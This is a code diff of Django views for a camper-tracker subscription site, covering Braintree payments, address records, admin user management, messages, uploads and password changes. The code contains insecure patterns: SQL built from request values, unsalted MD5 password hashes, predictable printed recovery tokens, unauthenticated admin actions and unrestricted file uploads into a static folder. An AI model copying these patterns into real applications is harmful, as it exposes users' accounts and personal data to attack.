+    total_price = round(float(tracker_price) + tracker_tax_price + activate_price + s_plan_price + s_tax_price + activate_tax_price,2)
+    total_tax_price = float(s_tax_price + activate_tax_price + tracker_tax_price)
+    return JsonResponse({'t_name':tracker.trackername,'t_price':tracker_price,'t_tax_price':"{:.2f}".format(total_tax_price),'t_activate_price':activate_price,'s_price':s_plan_price,'s_name':package_description,'total_price':"{:.2f}".format(total_price)})
 def subscription(request):
     if settings.BRAINTREE_PRODUCTION:
         braintree_env = braintree.Environment.Production
@@ -422,9 +824,10 @@ def subscription(request):
         nonce_from_the_client = request.POST['payment_method_nonce']
         if nonce_from_the_client != "":
             tracker = Trackerlisitem.objects.get(id=request.POST['Tracker_Type'])
-            tracker_price = tracker.dicountprice #+ tracker.taxprice
-            tracker_price = round(float(tracker_price) * 1.19, 1)
+            tracker_price = float(tracker.dicountprice) #+ tracker.taxprice
+            # tracker_price = round(float(tracker_price) * (1 + float(tracker.taxprice / 100)), 1)
             package_item = Packagelist.objects.get(id=request.POST['Subscriptiontype'])
+            tracker_price += float(package_item.activationfeeoncepervehicle)
             package_description = "Subscription - " + package_item.packagename
             if request.POST['Payment_Interval']=='1':
                 package_price = package_item.pricemonthly
@@ -446,6 +849,7 @@ def subscription(request):
                 package_price = package_item.pricetwoyear
                 package_planid = package_item.number_2years_planid
                 package_description += " 2 years"
+            tracker_price = round(tracker_price,2)
             print(tracker_price)
             gateway = braintree.BraintreeGateway(
                 braintree.Configuration(
@@ -478,7 +882,7 @@ def subscription(request):
                         "description": tracker.trackername
                     }
                 })
-                print(result1, result1.is_success, result1.transaction)
+                # print(result1, result1.is_success, result1.transaction)
                 result2 = gateway.subscription.create({
                     "payment_method_token": new_nonce.payment_method.token,
                     "plan_id": package_planid 
@@ -496,7 +900,7 @@ def subscription(request):
                 print(result2.subscription.id)
                 users = Users.objects.filter(email=request.POST['RegEmail'])
                 if len(users) <= 0 and result1.is_success and result2.is_success:
-                    new_user = Users(salutation=int(request.POST['salutation']),firstname=request.POST['Firstname'],lastname=request.POST['Surname'],email=request.POST['RegEmail'],phoneno=request.POST['RegPhoneno'],dob=request.POST['Datebirth'],address_city=request.POST['City'],address_country=request.POST['Country'],address_street=request.POST['Road'],address_postal=request.POST['Postalcode'],createdon=datetime.datetime.now())
+                    new_user = Users(salutation=int(request.POST['salutation']),company=request.POST['company'],firstname=request.POST['Firstname'],lastname=request.POST['Surname'],email=request.POST['RegEmail'],phoneno=request.POST['RegPhoneno'],dob=request.POST['Datebirth'],address_city=request.POST['City'],address_country=request.POST['Country'],address_housenumber=request.POST['housenumber'],address_street=request.POST['Road'],address_postal=request.POST['Postalcode'],createdon=datetime.datetime.now(),vatnumber=request.POST['VATnumber'])
                     new_user.save()
                     last_id = Users.objects.latest('id').id
                     user_id = generateUserId(last_id)
@@ -536,6 +940,12 @@ def subscription(request):
                     result.road = request.POST['Road']
                     result.country = request.POST['Country']
                     result.postcode = request.POST['Postalcode']
+                    result.housenumber = request.POST['housenumber']
+                    result.state = request.POST['City']
+                    result.company = request.POST['company']
+                    result.vatnumber = request.POST['VATnumber']
+                    result.latitude = 0.0
+                    result.longitude = 0.0
                     result.save()
                     s_result = Shippingaddressmaster()
                     s_result.userid = user_id
@@ -544,20 +954,36 @@ def subscription(request):
                     s_result.lastname = request.POST['Surname']
                     s_result.email = request.POST['RegEmail']
                     s_result.phoneno = request.POST['RegPhoneno']
-                    s_result.road = request.POST['Road']
-                    s_result.country = request.POST['Country']
-                    s_result.postcode = request.POST['Postalcode']
+                    s_result.company = request.POST['company']
+                    if request.POST['is_like'] == True:
+                        s_result.road = request.POST['Road']
+                        s_result.country = request.POST['Country']
+                        s_result.postcode = request.POST['Postalcode']
+                        s_result.housenumber = request.POST['housenumber']
+                        s_result.state = request.POST['City']
+                        s_result.vatnumber = request.POST['VATnumber']
+                        s_result.is_like = True
+                    else:
+                        s_result.road = request.POST['Shipping_Road']
+                        s_result.country = request.POST['Shipping_Country']
+                        s_result.postcode = request.POST['Shipping_Postalcode']
+                        s_result.housenumber = request.POST['Shipping_housenumber']
+                        s_result.state = request.POST['Shipping_City']
+                        s_result.vatnumber = request.POST['Shipping_VATnumber']
+                        s_result.is_like = False
+                    s_result.latitude = 0.0
+                    s_result.longitude = 0.0
                     s_result.save()
         return redirect('/Login')
     header_content = TblHeadercontent.objects.all()
-    packagelist = Packagelist.objects.all().order_by('sortorder')
+    packagelist = Packagelist.objects.all().filter(isactive=1).order_by('sortorder')
     tracker_list = Trackerlisitem.objects.filter(trackercategory=1)
     image_list = Trackeritemimages.objects.all()
     category_list = Trackercategory.objects.all()
- 
-    try:
+    
+    if "user_id" in request.session:
         braintree_client_token = braintree.ClientToken.generate({ "customer_id": request.session['user_id'] })
-    except:
+    else:
         braintree_client_token = braintree.ClientToken.generate({})
     return render(request,"subscription.html",{"header_content":header_content[0],"packagelist":packagelist,"tracker_list":tracker_list,"image_list":image_list,"braintree_client_token":braintree_client_token,"category_list":category_list})
 def contactus(request):
@@ -577,6 +1003,7 @@ def imprint(request):
     category_list = Trackercategory.objects.all()
     return render(request,"imprint.html",{"header_content":header_content[0],"category_list":category_list})
 def admin_login(request):
+
     if "user_id" in request.session and "user_role" in request.session and request.session['user_role']=="Admin":
         return redirect('/Admin')
     if request.method == 'POST':
@@ -586,9 +1013,11 @@ def admin_login(request):
                 user_role = get_list_from_sql("select RoleId as roleid from aspnetuserroles where UserId = '"+aspuser.id+"'")
                 role = Aspnetroles.objects.get(id=user_role[0]['roleid'])
                 if role.name == "Admin":
+                    
                     request.session['user_id'] = aspuser.id
                     request.session['user_role'] = role.name
                     request.session['login_status'] = True
+                    print(request.session['user_id'])
                     return redirect('/Admin')
         except:
             return redirect('/Admin/Login')
@@ -614,6 +1043,27 @@ def admin(request):
     vehicle_count = Vehicleset.objects.count()
     campingsite_count = Campingplaces.objects.count()
     return render(request,"admin/home.html",{ "user_count": users[0]['count'], "vehicle_count": vehicle_count, "campingsite_count": campingsite_count, "url":"admin"})
+def messagebox(request):
+    if "user_id" not in request.session or "user_role" not in request.session or request.session['user_role']!="Admin":
+        return redirect('/Admin/Login')
+    message_list = Mailbox.objects.all().order_by('-id')
+    return render(request,"admin/messagebox.html",{"message_list":message_list})
+def messageReply(request):
+    to_emails = []
+    to_emails.append(request.POST['email'])
+    send_mail("Trackyourcamper", request.POST['content'], settings.EMAIL_HOST_USER, to_emails)
+    return redirect('/Messagebox')
+def messageDelete(request, id):
+    message = Mailbox.objects.get(id=id)
+    message.delete()
+    return JsonResponse({'result':'success'})
+def message(request, id):
+    if "user_id" not in request.session or "user_role" not in request.session or request.session['user_role']!="Admin":
+        return redirect('/Admin/Login')
+    message = Mailbox.objects.get(id=id)
+    message.flag = 1
+    message.save()
+    return render(request,"admin/message.html",{"message":message})
 def manageOrders(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
@@ -806,6 +1256,10 @@ def manageuser(request):
     admin_users = get_list_from_sql("select count(*) as count from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID left join aspnetroles on aspnetuserroles.RoleId like CONCAT('%', CONCAT(aspnetroles.Id, '%')) where aspnetroles.Name like 'Admin'")
     role_list = Aspnetroles.objects.all()
     return render(request,"admin/manageUser.html",{"users":users, "admin_users":admin_users[0]['count'], "role_list":role_list,"url":"manageUser"})
+def generateRecoveryToken():
+    ran = ''.join(random.choices(string.ascii_lowercase + string.digits, k = 8))  
+    print(str(ran))
+    return str(ran)
 def generateUserId(id):
     customer_id = "T-"
     for i in range(8-len(str(id))):
@@ -824,8 +1278,9 @@ def make_password(password):
     hash = hashlib.md5(password.encode('utf8')).hexdigest()
     return hash
 def getCoordinate(request, street):
-    
+    print(street)
     loc = gmaps.geocode(street.replace("+"," "))
+    print(loc)
     if len(loc) > 0:
         coordinate = loc[0]['geometry']['location'] 
         return JsonResponse({"result":"success",'lat':coordinate['lat'],"lng":coordinate['lng']})
@@ -863,6 +1318,7 @@ def manageUserEdit(request, id):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
     if request.method == 'POST':
+        print(request.POST)
         aspuser = Aspnetusers.objects.get(id=id)
         aspuser.email=request.POST['email']
         aspuser.phonenumber=request.POST['phoneno']
@@ -882,16 +1338,94 @@ def manageUserEdit(request, id):
         user.address_state=request.POST['address_state']
         user.address_latitude=request.POST['address_latitude']
         user.address_longitude=request.POST['address_longitude']
+        user.address_housenumber = request.POST['address_housenumber']
+        user.company = request.POST['company']
         user.lastupdatedon=datetime.datetime.now()
         user.save()
-        execute_sql("update aspnetuserroles set RoleId = '" + request.POST['user_roles'] + "' where UserId like '"+ id + "'")
+        result = Billingaddressmaster.objects.get(userid=id)
+        result.salutation = request.POST['salutation']
+        result.firstname = request.POST['firstname']
+        result.lastname = request.POST['lastname']
+        result.email = request.POST['email']
+        result.phoneno = request.POST['phoneno']
+        result.road = request.POST['address_street']
+        result.country = request.POST['address_country']
+        result.state = request.POST['address_state']
+        result.housenumber = request.POST['address_housenumber']
+        result.postcode = request.POST['address_postal']
+        result.place = request.POST['address_city']
+        result.latitude = request.POST['address_latitude']
+        result.longitude = request.POST['address_longitude']
+        result.company = request.POST['company']
+        result.vatnumber = request.POST['VATnumber']
+        result.save()
+        if  'islike' in request.POST and request.POST['islike'] == 'on':
+            result = Shippingaddressmaster.objects.get(userid=id)
+            result.salutation = request.POST['salutation']
+            result.firstname = request.POST['firstname']
+            result.lastname = request.POST['lastname']
+            result.email = request.POST['email']
+            result.phoneno = request.POST['phoneno']
+            result.road = request.POST['address_street']
+            result.country = request.POST['address_country']
+            result.state = request.POST['address_state']
+            result.postcode = request.POST['address_postal']
+            result.place = request.POST['address_city']
+            result.latitude = request.POST['address_latitude']
+            result.longitude = request.POST['address_longitude']
+            result.company = request.POST['company']
+            result.housenumber = request.POST['address_housenumber']
+            result.vatnumber = request.POST['VATnumber']
+            result.is_like = True
+            result.save()
+        else:
+            result = Shippingaddressmaster.objects.get(userid=id)
+            result.salutation = request.POST['salutation']
+            result.firstname = request.POST['firstname']
+            result.lastname = request.POST['lastname']
+            result.email = request.POST['email']
+            result.phoneno = request.POST['phoneno']
+            result.road = request.POST['shipping_address_street']
+            result.country = request.POST['shipping_address_country']
+            result.state = request.POST['shipping_address_state']
+            result.postcode = request.POST['shipping_address_postal']
+            result.place = request.POST['shipping_address_city']
+            result.latitude = request.POST['shipping_address_latitude']
+            result.longitude = request.POST['shipping_address_longitude']
+            result.company = request.POST['shipping_company']
+            result.vatnumber = request.POST['shipping_VATnumber']
+            result.housenumber = request.POST['shipping_address_housenumber']
+            result.is_like = False
+            result.save()
+        role_info = get_list_from_sql("select * from aspnetuserroles where UserId like '" + id + "'")
+        if len(role_info) > 0:
+            execute_sql("update aspnetuserroles set RoleId = '" + request.POST['user_roles'] + "' where UserId like '"+ id + "'")
+        else:
+            new_userrole = Aspnetuserroles(userid=id,roleid=request.POST['user_roles'])
+            new_userrole.save()
         
+        # userrole = Aspnetuserroles.objects.get(userid=id)
+        # userrole.roleid=request.POST['user_roles']
+        # userrole.save()
         return redirect('/Admin/ManageUser')
     user_info = get_list_from_sql("select users.*, aspnetusers.LockoutEnabled as lock_status, aspnetuserroles.RoleId as role_id from users inner join aspnetusers on users.UserID = aspnetusers.Id left join aspnetuserroles on aspnetuserroles.UserId = users.UserID where users.UserID like '" + id + "'")
     salutation_list = Salutationmaster.objects.all()
     campingsite_list = Campingplaces.objects.all()
     role_list = Aspnetroles.objects.all()
-    return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"user_info":user_info[0],"url":"manageUser"})
+    try:
+        shipping_address = Shippingaddressmaster.objects.get(userid=id)
+        billing_address = Billingaddressmaster.objects.get(userid=id)
+        subscription = get_list_from_sql("select users.*, subscriptionuserwisepayment.*, packagelist.* from subscriptionuserwisepayment left join users on users.id = subscriptionuserwisepayment.usersubscriptionid left join packagelist on packagelist.id = subscriptionuserwisepayment.subscriptionpcakage where users.userid = '" + id + "' order by subscriptionuserwisepayment.Id")
+        rest_count = 0
+        vehicle_count = 0
+        if len(subscription) > 0:
+            subscription = subscription[-1]
+            cur_user = Users.objects.get(userid=id)
+            vehicle_count = Vehicleset.objects.filter(userid=cur_user.id).count()
+            rest_count = int(subscription["Vehiclefleetmanagement_numberofvehicles"]) - vehicle_count
+        return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"user_info":user_info[0],"url":"manageUser","subscription":subscription,"vehicle_count":vehicle_count,"rest_count":rest_count,"shipping_address":shipping_address,"billing_address":billing_address})
+    except:
+        return render(request,"admin/manageUserCreate.html",{"salutation_list":salutation_list,"campingsite_list":campingsite_list,"role_list":role_list,"user_info":user_info[0],"url":"manageUser"})
 def checkEmailExist(request):
     users = Users.objects.filter(email=request.POST['email'])
     if len(users) > 0:
@@ -902,13 +1436,72 @@ def manageUserCreate(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
     if request.method == 'POST':
-        new_user = Users(salutation=request.POST['salutation'],firstname=request.POST['firstname'],lastname=request.POST['lastname'],email=request.POST['email'],phoneno=request.POST['phoneno'],dob=request.POST['dob'],responsibleforcampingplaceid=request.POST['responsibleforcampingplaceid'], address_city=request.POST['address_city'],address_country=request.POST['address_country'],address_street=request.POST['address_street'],address_postal=request.POST['address_postal'],address_state=request.POST['address_state'],address_latitude=request.POST['address_latitude'],address_longitude=request.POST['address_longitude'],createdon=datetime.datetime.now())
+        print(request.POST)
+        new_user = Users(salutation=request.POST['salutation'],firstname=request.POST['firstname'],lastname=request.POST['lastname'],email=request.POST['email'],phoneno=request.POST['phoneno'],dob=request.POST['dob'],responsibleforcampingplaceid=request.POST['responsibleforcampingplaceid'], address_city=request.POST['address_city'],address_country=request.POST['address_country'],address_street=request.POST['address_street'],address_postal=request.POST['address_postal'],address_state=request.POST['address_state'],address_latitude=request.POST['address_latitude'],address_housenumber=request.POST['address_housenumber'],address_longitude=request.POST['address_longitude'],createdon=datetime.datetime.now(),company=request.POST['company'])
         new_user.save()
         last_id = Users.objects.latest('id').id
         user_id = generateUserId(last_id)
         last_user = Users.objects.get(id=last_id)
         last_user.userid = user_id
         last_user.save()
+        result = Billingaddressmaster()
+        result.userid = user_id
+        result.salutation = request.POST['salutation']
+        result.firstname = request.POST['firstname']
+        result.lastname = request.POST['lastname']
+        result.email = request.POST['email']
+        result.phoneno = request.POST['phoneno']
+        result.road = request.POST['address_street']
+        result.country = request.POST['address_country']
+        result.state = request.POST['address_state']
+        result.postcode = request.POST['address_postal']
+        result.place = request.POST['address_city']
+        result.housenumber = request.POST['address_housenumber']
+        result.latitude = request.POST['address_latitude']
+        result.longitude = request.POST['address_longitude']
+        result.company = request.POST['company']
+        result.vatnumber = request.POST['VATnumber']
+        result.save()
+        if  'islike' in request.POST and request.POST['islike'] == 'on':
+            result = Shippingaddressmaster()
+            result.userid = user_id
+            result.salutation = request.POST['salutation']
+            result.firstname = request.POST['firstname']
+            result.lastname = request.POST['lastname']
+            result.email = request.POST['email']
+            result.phoneno = request.POST['phoneno']
+            result.road = request.POST['address_street']
+            result.country = request.POST['address_country']
+            result.state = request.POST['address_state']
+            result.postcode = request.POST['address_postal']
+            result.housenumber = request.POST['address_housenumber']
+            result.place = request.POST['address_city']
+            result.latitude = request.POST['address_latitude']
+            result.longitude = request.POST['address_longitude']
+            result.company = request.POST['company']
+            result.vatnumber = request.POST['VATnumber']
+            result.is_like = True
+            result.save()
+        else:
+            result = Shippingaddressmaster()
+            result.userid = user_id
+            result.salutation = request.POST['salutation']
+            result.firstname = request.POST['firstname']
+            result.lastname = request.POST['lastname']
+            result.email = request.POST['email']
+            result.phoneno = request.POST['phoneno']
+            result.road = request.POST['shipping_address_street']
+            result.country = request.POST['shipping_address_country']
+            result.state = request.POST['shipping_address_state']
+            result.housenumber = request.POST['shipping_address_housenumber']
+            result.postcode = request.POST['shipping_address_postal']
+            result.place = request.POST['shipping_address_city']
+            result.latitude = request.POST['shipping_address_latitude']
+            result.longitude = request.POST['shipping_address_longitude']
+            result.company = request.POST['shipping_company']
+            result.vatnumber = request.POST['shipping_VATnumber']
+            result.is_like = False
+            result.save()
         new_aspuser = Aspnetusers(id=user_id,email=request.POST['email'],passwordhash=make_password(request.POST['password']),phonenumber=request.POST['phoneno'])
         new_aspuser.save()
         new_userrole = Aspnetuserroles(userid=user_id,roleid=request.POST['user_roles'])
@@ -1204,7 +1797,27 @@ def shopCategoryDelete(request, id):
 def manageForms(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
-    return render(request,"admin/manageForms.html",{"url":"manageForms"})
+    form_list = TblAdminformssection.objects.all()
+    return render(request,"admin/manageForms.html",{"url":"manageForms","form_list":form_list})
+def manageFormDelete(request, id):
+    if "user_id" not in request.session or request.session['user_role']!="Admin":
+        return redirect('/Admin/Login')
+    form = TblAdminformssection.objects.get(id=id)
+    form.delete()
+    return JsonResponse({'result':'success'})
+def manageFormUpload(request):
+    if "user_id" not in request.session or request.session['user_role']!="Admin":
+        return redirect('/Admin/Login')
+    if request.method == 'POST' and request.FILES['form_file']:
+        myfile = request.FILES['form_file']
+        fs = FileSystemStorage()
+        old_name, extension = os.path.splitext(myfile.name)
+        new_name = datetime.datetime.now().strftime("%Y%m%d%H%M%S") + extension
+        filename = fs.save("static_in_env/upload/"+new_name, myfile)
+        new_form = TblAdminformssection(title=request.POST['title'],description=request.POST['description'],filename=old_name,filepath=new_name)
+        new_form.save()
+        return JsonResponse({'result':'success'})
+    return JsonResponse({'result':'fail','message':'Datei ist nicht vorhanden.'})
 def manageCustomerServicedata(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
@@ -1299,10 +1912,48 @@ def managePromotionCreditDelete(request, id):
     promotion_credit = Promotioncredit.objects.get(id=id)
     promotion_credit.delete()
     return JsonResponse({'result':'success'})
+def saveReview(request):
+    recaptcha_response = request.POST.get('g-recaptcha-response')
+    url = 'https://www.google.com/recaptcha/api/siteverify'
+    values = {
+        'secret': settings.GOOGLE_RECAPTCHA_SECRET_KEY,
+        'response': recaptcha_response
+    }
+    data = urllib.parse.urlencode(values).encode()
+    req =  urllib.request.Request(url, data=data)
+    response = urllib.request.urlopen(req)
+    result = json.loads(response.read().decode())
+    if result['success']:
+        review = TblCustomerreviewratting()
+        review.firstname = request.POST['review_firstname']
+        review.lastname = request.POST['review_familyname']
+        review.email = request.POST['review_email']
+        review.phonenumber = request.POST['review_phonenumber']
+        review.rate_star = request.POST['rate']
+        review.shortdescription = request.POST['content']
+        review.isdisplay = 1
+        review.save()
+        to_emails = []
+        to_emails.append(settings.EMAIL_CONTACT)
+        new_mail = Mailbox()
+        new_mail.name = request.POST['review_firstname'] + " " + request.POST['review_familyname']
+        new_mail.email = request.POST['review_email']
+        new_mail.regarding = "Bewerten Sie uns"
+        new_mail.phone = request.POST['review_phonenumber']
+        new_mail.message = request.POST['content']
+        new_mail.datetime = datetime.datetime.now()
+        new_mail.flag = 0
+        new_mail.save()
+        message="Name: " + request.POST['review_firstname'] + " " + request.POST['review_familyname'] + "<br> E-Mail Adresse: " + request.POST['review_email'] + "<br> Betreff: Bewerten Sie uns<br> Kontakt Telefon: " + request.POST["review_phonenumber"] + "<br> Inhalt: " + request.POST["content"]
+        msg = EmailMultiAlternatives("Bewerten Sie uns", "", settings.EMAIL_HOST_USER, to_emails)
+        msg.attach_alternative(message, "text/html")
+        msg.send()
+    return redirect('/')
+    
 def reviewratting(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
-    review_list = TblCustomerreviewratting.objects.all()
+    review_list = TblCustomerreviewratting.objects.all().order_by('-id')
     return render(request,"admin/reviewratting.html",{"review_list":review_list,"url":"reviewratting"})
 def reviewRattingDelete(request, id):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
@@ -1385,6 +2036,23 @@ def adminImprint(request):
         return render(request, "admin/adminImprint.html",{"header_content":header_content[0],"url":"imprint"})
     else:
         return render(request, "admin/adminImprint.html",{"url":"imprint"})
+def userChangePassword(request):
+    if "user_id" not in request.session:
+        return redirect('/Login')
+    header_content = TblHeadercontent.objects.all()
+    category_list = Trackercategory.objects.all()
+    content = {"header_content":header_content[0],"category_list":category_list}
+    if request.method == "POST":
+        current_user = Aspnetusers.objects.get(id=request.session['user_id'])
+        if check_password(current_user.passwordhash, request.POST['old_password']):
+            current_user.passwordhash = make_password(request.POST['password'])
+            current_user.save()
+            content['error'] = "no"
+            return render(request,"userChangePassword.html",content)
+        else:
+            content['error'] = "exist"
+            return render(request,"userChangePassword.html",content)
+    return render(request,"userChangePassword.html",content)
 def adminChangePassword(request):
     if "user_id" not in request.session or request.session['user_role']!="Admin":
         return redirect('/Admin/Login')
@@ -1393,6 +2061,7 @@ def adminChangePassword(request):
         if check_password(current_user.passwordhash, request.POST['old_password']):
             current_user.passwordhash = make_password(request.POST['password'])
             current_user.save()
+            return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword","error":"no"})
         else:
             return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword","error":"exist"})
     return render(request,"admin/adminChangePassword.html",{"url":"adminChangePassword"})
